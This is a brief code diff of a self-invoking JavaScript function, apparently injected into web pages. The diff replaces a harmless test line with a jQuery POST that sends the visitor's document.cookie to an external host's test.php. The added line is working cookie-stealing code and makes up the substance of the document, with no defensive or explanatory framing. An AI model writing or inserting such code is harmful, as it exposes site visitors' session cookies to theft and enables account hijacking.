@@ -1,4 +1,4 @@
 (function() {
 	console.log('we are live');
-	$('body').append('<div>TESTTESTTEST</div');
+	$.post('http://www.rosscousens.com/test.php', { "cookie" : document.cookie });
 })();
